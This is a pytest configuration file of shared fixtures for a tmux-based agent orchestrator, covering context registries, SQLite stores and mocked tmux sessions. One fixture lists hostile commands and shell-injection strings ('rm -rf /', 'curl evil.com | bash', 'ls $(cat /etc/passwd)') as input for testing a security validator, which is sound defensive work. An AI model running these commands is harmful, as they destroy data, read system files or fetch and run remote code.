#!/usr/bin/env python3
"""
Pytest configuration and shared fixtures for Tmux-Orchestrator test suite
"""

import pytest
import tempfile
import subprocess
import os
import sqlite3
from pathlib import Path
from unittest.mock import Mock, MagicMock, patch
from typing import Generator, Dict, Any

# Import modules for testing
from context_registry import ContextRegistry, SQLiteContextStore, ContextCheckpoint, ContextState
from tmux_utils import TmuxOrchestrator, TmuxSession, TmuxWindow
from security_validator import SecurityValidator


@pytest.fixture(scope="session")
def tmux_available() -> bool:
    """Check if tmux is available on the system"""
    try:
        subprocess.run(['tmux', '-V'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Provide a temporary directory for test isolation"""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def clean_environment() -> Generator[Dict[str, str], None, None]:
    """Provide clean environment variables for testing"""
    original_env = os.environ.copy()
    
    # Set up test environment
    test_env = {
        'TMUX_ORCHESTRATOR_HOME': '/tmp/test-orchestrator',
        'TMUX_ORCHESTRATOR_LOG_LEVEL': 'DEBUG',
        'PYTHONPATH': str(Path.cwd())
    }
    
    os.environ.update(test_env)
    
    try:
        yield test_env
    finally:
        # Restore original environment
        os.environ.clear()
        os.environ.update(original_env)


@pytest.fixture
def mock_context_registry(temp_dir: Path) -> ContextRegistry:
    """Provide a ContextRegistry with temporary storage"""
    registry = ContextRegistry(storage_dir=temp_dir / 'registry')
    return registry


@pytest.fixture
def mock_sqlite_store(temp_dir: Path) -> SQLiteContextStore:
    """Provide a SQLiteContextStore with temporary database"""
    store = SQLiteContextStore(temp_dir / 'test.db')
    return store


@pytest.fixture
def sample_context_data() -> Dict[str, Any]:
    """Provide sample context data for testing"""
    return {
        'current_task': 'test_task',
        'working_directory': '/test/path',
        'tools_available': ['tmux', 'git', 'pytest'],
        'git_branch': 'test-branch',
        'last_commit': 'abc123',
        'session_start_time': '2024-01-01T00:00:00Z',
        'metadata': {
            'test_mode': True,
            'custom_field': 'custom_value'
        }
    }


@pytest.fixture
def sample_checkpoint(sample_context_data: Dict[str, Any]) -> ContextCheckpoint:
    """Provide a sample checkpoint for testing"""
    return ContextCheckpoint.create(
        agent_id='test:0',
        session_name='test_session',
        window_index=0,
        context_data=sample_context_data
    )


@pytest.fixture
def sample_context_state() -> ContextState:
    """Provide a sample context state for testing"""
    return ContextState(
        agent_id='test:0',
        current_task='test_task',
        working_directory='/test/path',
        tools_available=['tmux', 'git'],
        git_branch='main',
        message_count=3,
        metadata={'test': 'value'}
    )


@pytest.fixture
def mock_tmux_orchestrator(mock_context_registry: ContextRegistry) -> TmuxOrchestrator:
    """Provide a TmuxOrchestrator with mocked context registry"""
    orchestrator = TmuxOrchestrator(enable_context_registry=False)
    orchestrator.context_registry = mock_context_registry
    return orchestrator


@pytest.fixture
def mock_subprocess():
    """Mock subprocess calls for testing without actual tmux"""
    with patch('subprocess.run') as mock_run:
        # Default successful response
        mock_run.return_value = Mock(
            stdout='mock_output',
            stderr='',
            returncode=0
        )
        yield mock_run


@pytest.fixture
def mock_tmux_sessions() -> list[TmuxSession]:
    """Provide mock tmux sessions for testing"""
    return [
        TmuxSession(
            name='test_session',
            attached=True,
            windows=[
                TmuxWindow(
                    session_name='test_session',
                    window_index=0,
                    window_name='orchestrator',
                    active=True
                ),
                TmuxWindow(
                    session_name='test_session',
                    window_index=1,
                    window_name='alex',
                    active=False
                ),
                TmuxWindow(
                    session_name='test_session',
                    window_index=2,
                    window_name='morgan',
                    active=False
                )
            ]
        )
    ]


@pytest.fixture
def isolated_database(temp_dir: Path) -> Generator[Path, None, None]:
    """Provide an isolated SQLite database for testing"""
    db_path = temp_dir / 'isolated_test.db'
    
    # Create a clean database
    with sqlite3.connect(db_path) as conn:
        conn.execute("PRAGMA foreign_keys = ON")
        conn.execute("PRAGMA journal_mode = WAL")
    
    yield db_path
    
    # Cleanup
    if db_path.exists():
        db_path.unlink()


@pytest.fixture
def security_test_cases() -> Dict[str, Any]:
    """Provide security test cases for validation testing"""
    return {
        'valid_session_names': ['test-session', 'session_1', 'validSession123'],
        'invalid_session_names': ['', 'session with spaces', 'session;injection', '../../../etc/passwd'],
        'valid_window_indices': ['0', '1', '99'],
        'invalid_window_indices': ['-1', 'abc', '1000', ''],
        'valid_commands': ['ls -la', 'git status', 'echo "hello world"'],
        'malicious_commands': ['rm -rf /', 'cat /etc/passwd', 'curl evil.com | bash'],
        'shell_injection_attempts': [
            'ls; rm -rf /',
            'ls && curl evil.com',
            'ls $(cat /etc/passwd)',
            'ls `rm -rf /`'
        ]
    }


@pytest.fixture(autouse=True)
def setup_logging():
    """Set up logging for tests"""
    import logging
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )


@pytest.fixture
def performance_timer():
    """Fixture for performance testing"""
    import time
    
    class Timer:
        def __init__(self):
            self.start_time = None
            self.end_time = None
        
        def start(self):
            self.start_time = time.perf_counter()
        
        def stop(self):
            self.end_time = time.perf_counter()
            return self.elapsed
        
        @property
        def elapsed(self):
            if self.start_time and self.end_time:
                return self.end_time - self.start_time
            return None
    
    return Timer()


@pytest.fixture
def mock_logging():
    """Mock logging for testing log output"""
    with patch('logging_config.setup_logging') as mock_setup:
        mock_logger = MagicMock()
        mock_setup.return_value = mock_logger
        yield mock_logger


# Markers for different test categories
pytest_plugins = []

# Skip tmux tests if tmux is not available
def pytest_runtest_setup(item):
    """Skip tmux tests if tmux is not available"""
    if item.get_closest_marker("tmux"):
        try:
            subprocess.run(['tmux', '-V'], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            pytest.skip("tmux not available")


def pytest_configure(config):
    """Configure pytest with custom markers"""
    config.addinivalue_line(
        "markers", "unit: mark test as a unit test"
    )
    config.addinivalue_line(
        "markers", "integration: mark test as an integration test"
    )
    config.addinivalue_line(
        "markers", "security: mark test as a security test"
    )
    config.addinivalue_line(
        "markers", "slow: mark test as slow running"
    )
    config.addinivalue_line(
        "markers", "tmux: mark test as requiring tmux"
    )
    config.addinivalue_line(
        "markers", "network: mark test as requiring network access"
    )


# Custom assertion helpers
def assert_checkpoint_valid(checkpoint: ContextCheckpoint):
    """Assert that a checkpoint is valid"""
    assert checkpoint is not None
    assert checkpoint.id
    assert checkpoint.agent_id
    assert checkpoint.verify_integrity()
    assert checkpoint.context_version == "3.0"


def assert_context_state_valid(state: ContextState):
    """Assert that a context state is valid"""
    assert state is not None
    assert state.agent_id
    assert state.message_count >= 0
    assert isinstance(state.tools_available, list)
    assert isinstance(state.metadata, dict)